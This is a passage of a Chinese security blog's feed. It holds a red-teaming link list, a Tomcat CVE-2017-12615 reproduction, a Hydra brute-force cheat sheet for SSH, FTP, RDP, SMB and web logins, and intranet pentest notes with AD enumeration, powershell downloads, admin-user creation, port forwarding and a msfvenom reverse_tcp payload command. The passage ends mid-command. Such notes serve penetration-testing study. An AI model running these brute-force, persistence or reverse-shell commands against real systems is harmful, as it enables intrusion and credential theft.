href="https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/" target="_blank" rel="noopener">InternetExplorer.Application for C2</a></li></ul><h3 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h3><ul><li><a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 1</a></li><li><a href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 2</a></li><li><a href="https://rastamouse.me/2018/02/red-team-infrastructure---aws-encrypted-ebs/" target="_blank" rel="noopener">Red Team Infrastructure - AWS Encrypted EBS</a></li><li><a href="https://cybersyndicates.com/2016/11/top-red-team-tips/" target="_blank" rel="noopener">6 RED TEAM INFRASTRUCTURE TIPS</a></li><li><a href="https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/" target="_blank" rel="noopener">How to Build a C2 Infrastructure with Digital Ocean – Part 1</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/" target="_blank" rel="noopener">Infrastructure for Ongoing Red Team Operations</a></li><li><a href="https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e" target="_blank" rel="noopener">Attack Infrastructure Log Aggregation and Monitoring</a></li><li><a href="https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/" target="_blank" rel="noopener">Randomized Malleable C2 Profiles Made Easy</a></li><li><a href="https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/" target="_blank" rel="noopener">Migrating Your infrastructure</a></li><li><a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">ICMP C2</a></li><li><a href="https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/" target="_blank" rel="noopener">Using WebDAV features as a covert channel</a></li><li><a href="https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac" target="_blank" rel="noopener">Safe Red Team Infrastructure</a></li><li><a href="https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/" target="_blank" rel="noopener">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT</a></li><li><a href="http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/" target="_blank" rel="noopener">Command and Control Using Active Directory</a></li><li><a href="https://blog.cobaltstrike.com/2013/02/12/a-vision-for-distributed-red-team-operations/" target="_blank" rel="noopener">A Vision for Distributed Red Team Operations</a></li><li><a href="https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/" target="_blank" rel="noopener">Designing Effective Covert Red Team Attack Infrastructure</a></li><li><a href="https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/" target="_blank" rel="noopener">Serving Random Payloads with Apache mod_rewrite</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html" target="_blank" rel="noopener">Mail Servers Made Easy</a></li><li><a href="https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/" target="_blank" rel="noopener">Securing your Empire C2 with Apache mod_rewrite</a></li><li><a href="https://jordan-wright.com/blog/post/2018-02-04-automating-gophish-releases/" target="_blank" rel="noopener">Automating Gophish Releases With Ansible and Docker</a></li><li><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/" target="_blank" rel="noopener">How to Write Malleable C2 Profiles for Cobalt Strike</a></li><li><a href="https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-profiles-for-empire/" target="_blank" rel="noopener">How to Make Communication Profiles for Empire</a></li><li><a href="http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/" target="_blank" rel="noopener">A Brave New World: Malleable C2</a></li><li><a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable Command and Control</a></li></ul><h2 id="↑-Embedded-and-Peripheral-Devices-Hacking"><a href="#↑-Embedded-and-Peripheral-Devices-Hacking" class="headerlink" title="↑ Embedded and Peripheral Devices Hacking"></a><a href="#table-of-contents">↑</a> Embedded and Peripheral Devices Hacking</h2><ul><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Getting-in-with-the-Proxmark-3-and-ProxBrute/" target="_blank" rel="noopener">Gettting in with the Proxmark3 &amp; ProxBrute</a></li><li><a href="https://blog.nviso.be/2017/01/11/a-practical-guide-to-rfid-badge-copying/" target="_blank" rel="noopener">Practical Guide to RFID Badge copying</a></li><li><a href="https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/" target="_blank" rel="noopener">Contents of a Physical Pentester Backpack</a></li><li><a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">MagSpoof - credit card/magstripe spoofer</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">Wireless Keyboard Sniffer</a></li><li><a href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/" target="_blank" rel="noopener">RFID Hacking with The Proxmark 3</a></li><li><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Tutorial_Proxmark_the_Swiss_Army_Knife_for_RFID_Security_Research-RFIDSec12.pdf" target="_blank" rel="noopener">Swiss Army Knife for RFID</a></li><li><a href="https://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12_Miller_NFC_attack_surface_WP.pdf" target="_blank" rel="noopener">Exploring NFC Attack Surface</a></li><li><a href="http://gerhard.dekoninggans.nl/documents/publications/dekoninggans.phd.thesis.pdf" target="_blank" rel="noopener">Outsmarting smartcards</a></li><li><a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/" target="_blank" rel="noopener">Reverse engineering HID iClass Master keys</a></li><li><a href="https://www.pwnieexpress.com/aopp" target="_blank" rel="noopener">Android Open Pwn Project (AOPP)</a></li></ul><h2 id="↑-Misc"><a href="#↑-Misc" class="headerlink" title="↑ Misc"></a><a href="#table-of-contents">↑</a> Misc</h2><ul><li><a href="https://github.com/vysec/RedTips" target="_blank" rel="noopener">Red Tips of Vysec</a></li><li><a href="https://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/" target="_blank" rel="noopener">Cobalt Strike Tips for 2016 ccde red teams</a></li><li><a href="https://blog.cobaltstrike.com/2015/07/09/models-for-red-team-operations/" target="_blank" rel="noopener">Models for Red Team Operations</a></li><li><a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">Planning a Red Team exercise</a></li><li><a href="https://www.youtube.com/watch?v=oclbbqvawQg" target="_blank" rel="noopener">Raphael Mudge - Dirty Red Team tricks</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-one-e38e06ffd604" target="_blank" rel="noopener">introducing the adversary resilience methodology part 1</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-two-279a1ed7863d" target="_blank" rel="noopener">introducing the adversary resilience methodology part 2</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible red team</a></li><li><a href="https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2017</a></li><li><a href="https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/" target="_blank" rel="noopener">How I Prepared to Red Team at PRCCDC 2015</a></li><li><a href="https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2016</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible Red Teams</a></li></ul><h2 id="↑-RedTeam-Gadgets"><a href="#↑-RedTeam-Gadgets" class="headerlink" title="↑ RedTeam Gadgets"></a><a href="#table-of-contents">↑</a> RedTeam Gadgets</h2><h4 id="Network-Implants"><a href="#Network-Implants" class="headerlink" title="Network Implants"></a>Network Implants</h4><ul><li><a href="https://hackerwarehouse.com/product/lan-tap-pro/" target="_blank" rel="noopener">LAN Tap Pro</a></li><li><a href="https://hakshop.com/collections/network-implants/products/lan-turtle" target="_blank" rel="noopener">LAN Turtle</a></li><li><a href="https://hakshop.com/collections/physical-access/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://hakshop.com/products/packet-squirrel" target="_blank" rel="noopener">Packet Squirrel</a><h4 id="Wifi-Auditing"><a href="#Wifi-Auditing" class="headerlink" title="Wifi Auditing"></a>Wifi Auditing</h4></li><li><a href="https://hakshop.com/products/wifi-pineapple" target="_blank" rel="noopener">WiFi Pineapple</a></li><li><a href="https://hackerwarehouse.com/product/alfa-802-11bgn-long-range-usb-wireless-adapter/" target="_blank" rel="noopener">Alpha Long range Wireless USB</a></li><li><a href="https://www.tindie.com/products/lspoplove/dstike-wifi-deauther-monster/" target="_blank" rel="noopener">Wifi-Deauth Monster</a></li><li><a href="https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl" target="_blank" rel="noopener">Crazy PA</a><h4 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h4></li><li><a href="https://hackerwarehouse.com/product/blekey/" target="_blank" rel="noopener">BLE Key</a></li><li><a href="https://hackerwarehouse.com/product/proxmark3-kit/" target="_blank" rel="noopener">Proxmark3</a></li><li><a href="https://www.attify-store.com/products/zigbee-sniffing-tool-atmel-rzraven" target="_blank" rel="noopener">Zigbee Sniffer</a></li><li><a href="https://www.attify-store.com/collections/frontpage/products/jtag-exploitation-kit-with-lab-manual" target="_blank" rel="noopener">Attify IoT Exploit kit</a><h4 id="Software-Defined-Radio-SDR"><a href="#Software-Defined-Radio-SDR" class="headerlink" title="Software Defined Radio - SDR"></a>Software Defined Radio - SDR</h4></li><li><a href="https://hackerwarehouse.com/product/hackrf-one-kit/" target="_blank" rel="noopener">HackRF One Bundle</a></li><li><a href="https://hackerwarehouse.com/product/rtlsdr/" target="_blank" rel="noopener">RTL-SDR</a></li><li><a href="https://hackerwarehouse.com/product/yard-stick-one-kit/" target="_blank" rel="noopener">YARD stick one Bundle</a></li><li><a href="https://hackerwarehouse.com/product/ubertooth-one/" target="_blank" rel="noopener">Ubertooth</a><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4></li><li><a href="https://hackerwarehouse.com/product/keygrabber/" target="_blank" rel="noopener">Key Grabber</a></li><li><a href="https://store.ryscc.com/products/magspoof%20" target="_blank" rel="noopener">Magspoof</a></li><li><a href="https://samy.pl/poisontap/" target="_blank" rel="noopener">Poison tap</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">keysweeper</a></li><li><a href="https://hakshop.com/collections/physical-access/products/usb-rubber-ducky-deluxe" target="_blank" rel="noopener">USB Rubber Ducky</a></li></ul><h2 id="↑-Ebooks"><a href="#↑-Ebooks" class="headerlink" title="↑ Ebooks"></a><a href="#table-of-contents">↑</a> Ebooks</h2><ul><li><a href="https://www.amazon.com/Next-Generation-Teaming-Henry-Dalziel/dp/0128041714" target="_blank" rel="noopener">Next Generation Red Teaming</a></li><li><a href="https://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits/dp/0128006048" target="_blank" rel="noopener">Targeted Cyber Attack</a></li><li><a href="https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689" target="_blank" rel="noopener">Advanced Penetration Testing: Hacking the World’s Most Secure Networks</a></li><li><a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/" target="_blank" rel="noopener">Social Engieers’ Playbook Pretical Pretexting</a></li></ul><h2 id="↑-Training-Free"><a href="#↑-Training-Free" class="headerlink" title="↑ Training ( Free )"></a><a href="#table-of-contents">↑</a> Training ( Free )</h2><ul><li><a href="https://www.youtube.com/watch?v=IRpS7oZ3z0o&amp;list=PL9HO6M_MU2nesxSmhJjEvwLhUoHPHmXvz" target="_blank" rel="noopener">Tradecraft - a course on red team operations</a></li><li><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/" target="_blank" rel="noopener">Advanced Threat Tactics Course &amp; Notes</a></li></ul><h2 id="↑-Certification"><a href="#↑-Certification" class="headerlink" title="↑ Certification"></a><a href="#table-of-contents">↑</a> Certification</h2><ul><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-specialist/" target="_blank" rel="noopener">CREST Certified Simulated Attack Specialist</a></li><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-manager/" target="_blank" rel="noopener">CREST Certified Simulated Attack Manager</a></li><li><a href="https://www.sans.org/course/red-team-operations-and-threat-emulation" target="_blank" rel="noopener">SEC564: Red Team Operations and Threat Emulation</a></li><li><a href="https://www.elearnsecurity.com/course/penetration_testing_extreme/" target="_blank" rel="noopener">ELearn Security Penetration Testing eXtreme</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Awesome-Red-Teaming&quot;&gt;&lt;a href=&quot;#Awesome-Red-Teaming&quot; class=&quot;headerlink&quot; title=&quot;Awesome Red Teaming&quot;&gt;&lt;/a&gt;Awesome Red Teaming&lt;/h1&gt;&lt;p&gt;Li
      
    
    </summary>
    
      <category term="Tools" scheme="https://yaalonsong.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-12615漏洞复现</title>
    <link href="https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html</id>
    <published>2019-02-28T09:49:30.333Z</published>
    <updated>2019-02-28T14:18:53.744Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式:"></a><strong>漏洞利用条件和方式:</strong></h2><ul><li>CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。</li></ul><p>CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80</p><p>CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79</p><h2 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h2><p><img src="/uploads/tom1.png" alt=""></p><p><strong>U:test</strong></p><p><strong>P:test123</strong></p><p><img src="/uploads/tom2.png" alt=""></p><blockquote><p><strong>JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25</strong></p><p><strong>CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></p><p><strong>Path=  %JAVA_HOME%/bin</strong></p></blockquote><p><strong>新增2个变量</strong></p><blockquote><p>CATALINA_HOME= tomcat路径</p><p>CATALINA_BASE= tomcat路径</p><p>CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar</p></blockquote><p>1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置</p><p> 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成”</p><p>3、Server.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">connectionTimeout=&quot;20000&quot;</span><br><span class="line">redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt;</span><br></pre></td></tr></table></figure><p>C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml</p><p>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   &lt;init-param&gt;</span><br><span class="line">   &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure><p><img src="/uploads/tom3.png" alt=""></p><p><img src="/uploads/tom4.png" alt=""></p><p><img src="/uploads/tom5.png" alt=""></p><p><img src="/uploads/tom6.png" alt=""></p><p><img src="/uploads/tom7.png" alt=""></p><p><img src="/uploads/tom8.png" alt=""></p><p><img src="/uploads/tom9.png" alt=""></p><p><img src="/uploads/tom10.png" alt=""></p><blockquote><p>提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制：</p></blockquote><p><img src="/uploads/tom11.png" alt=""></p><p><strong><em>7.0.81</em></strong></p><p><img src="/uploads/tom12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞利用条件和方式&quot;&gt;&lt;a href=&quot;#漏洞利用条件和方式&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用条件和方式:&quot;&gt;&lt;/a&gt;&lt;strong&gt;漏洞利用条件和方式:&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CVE-2017-12615漏洞利
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://yaalonsong.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://yaalonsong.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hydra 的使用</title>
    <link href="https://yaalonsong.github.io/2019/02/26/hydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/hydra-的使用.html</id>
    <published>2019-02-26T15:11:39.873Z</published>
    <updated>2019-02-26T15:24:12.702Z</updated>
    
    <content type="html"><![CDATA[<p>字典集<br><a href="https://www.weakpass.com/" target="_blank" rel="noopener">https://www.weakpass.com/</a><br>1.破解ssh<br>（1）破解指定用户名密码</p><blockquote><p>hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ssh -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><a id="more"></a><p>（2）批量破解ssh账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -V<br>hydra -L list_user -P list_password 192.168.56.101 ssh -V</p></blockquote><p>2.破解ftp</p><p>（1）破解指定用户名密码</p><blockquote><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><p>（2）批量破解FTP账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -V<br>hydra -L list_user -P list_password 192.168.56.101 ftp -V</p></blockquote><p>3．GET方式提交，破解Web登录</p><blockquote><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</p></blockquote><p> 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录</p><p>（1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password”</p><blockquote><p>hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V</p></blockquote><p>（2）对admin密码进行破解</p><blockquote><p>hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“</p></blockquote><p>“-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解；</p><p>5．破解HTTPS</p><blockquote><p>hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https</p></blockquote><p>6．破解teamspeak</p><blockquote><p>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</p></blockquote><p>7．破解Cisco</p><blockquote><p>hydra -P pass.txt 192.168.0.115 cisco<br>hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable</p></blockquote><p>8．破解SMB</p><blockquote><p>hydra -l administrator -P pass.txt 192.168.0.115 smb</p></blockquote><p>9．破解POP3</p><blockquote><p>hydra -l muts -P pass.txt my.pop3.mail pop3</p></blockquote><p>10．破解远程终端账号</p><p>（1）破解管理员账号</p><blockquote><p>hydra ip rdp -l administrator -P pass.txt -V</p></blockquote><p>（2）批量破解账号</p><blockquote><p>hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt –V</p></blockquote><p>11．破解HTTP-Proxy</p><blockquote><p>hydra -l admin -P pass.txt http-proxy://192.168.0.115</p></blockquote><p>12．破解IMAP</p><blockquote><p>hydra -L user.txt -p secret 192.168.0.115 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;字典集&lt;br&gt;&lt;a href=&quot;https://www.weakpass.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.weakpass.com/&lt;/a&gt;&lt;br&gt;1.破解ssh&lt;br&gt;（1）破解指定用户名密码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vV&lt;br&gt;hydra ip ssh -l 用户名 -P 密码字典 -e ns -vV&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="kali" scheme="https://yaalonsong.github.io/categories/kali/"/>
    
    
      <category term="hydra" scheme="https://yaalonsong.github.io/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透小记</title>
    <link href="https://yaalonsong.github.io/2019/02/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/内网渗透小记.html</id>
    <published>2019-02-26T14:33:16.702Z</published>
    <updated>2019-02-26T14:41:00.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用一句话webshell"><a href="#常用一句话webshell" class="headerlink" title="常用一句话webshell"></a>常用一句话webshell</h2><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt;  查看dns列表（DC执行）</span><br><span class="line">tasklist /SVC   查看系统进程及其描述</span><br><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net user  查看本机用户</span><br><span class="line">net user /domain 查看域用户</span><br><span class="line">net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view \\\\dc   查看 dc 域内共享文件</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line">net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</span><br><span class="line">net group &quot;domain controllers&quot; /domain 域控</span><br><span class="line">net time /domain </span><br><span class="line">net config workstation   当前登录域 - 计算机名 - 用户名</span><br><span class="line">net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</span><br><span class="line">ipconfig</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc   详细进程信息</span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line">taskkill /im  imagename  /f  结束进程</span><br><span class="line">net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line">netstat -ano</span><br><span class="line">nltest /dclist:xx  查看域控</span><br><span class="line">nltest /domain_trusts   查看域信任信息</span><br><span class="line">whoami /all 查看 Mandatory Label uac 级别和 sid 号</span><br><span class="line">net sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line">net share     共享目录</span><br><span class="line">cmdkey /l   查看保存登陆凭证</span><br><span class="line">echo %logonserver%  查看登陆域</span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line">set  环境变量</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery computer 查询所有计算机名称 windows 2003</span><br><span class="line">dir /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line">arp -a</span><br><span class="line">tracert  查路由</span><br></pre></td></tr></table></figure><h2 id="windows-下载文件"><a href="#windows-下载文件" class="headerlink" title="windows 下载文件"></a>windows 下载文件</h2><ul><li><p>bitsadmin</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download文件</span><br><span class="line">bitsadmin /transfer n https://www.baidu.com/robots.txt c:\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一条命令download文件</span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>,<span class="string">'C:\1.txt'</span>)</span><br><span class="line">多条命令download文件</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">new-object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$client</span>.DownloadFile(<span class="string">'https://www.baidu.com/robots.txt'</span>, <span class="string">'C:\1.txt'</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="添加删除用户操作"><a href="#添加删除用户操作" class="headerlink" title="添加删除用户操作"></a>添加删除用户操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add    添加用户并设置管理员</span><br><span class="line">net user admin1 /del</span><br></pre></td></tr></table></figure><h2 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h2><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p>tools:<br><a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a><br>正向：<br>被攻击机(跳板)：</p><blockquote><p>./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)<br>netstat -pantu|grep 9999 (查看是否侦听成功)</p></blockquote><p>攻击机：</p><blockquote><p>proxychain 设置 socks5 为跳板 ip port<br>proxychain nmap 即可以用跳板代理扫描其他主机</p></blockquote><h4 id="netsh-Windows-自带工具-windows-端口转发"><a href="#netsh-Windows-自带工具-windows-端口转发" class="headerlink" title="netsh   Windows 自带工具   windows 端口转发"></a>netsh   Windows 自带工具   windows 端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4  listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4  connectport=8880</span><br><span class="line">netsh interface  portproxy show  v4tov4</span><br><span class="line">netsh interface portproxy delete v4tov4  listenaddress=0.0.0.0 listenport=53</span><br></pre></td></tr></table></figure><p>MSF反弹 shell  </p><blockquote><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe </p></blockquote><p>1.生成一个回连木马</p><blockquote><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f 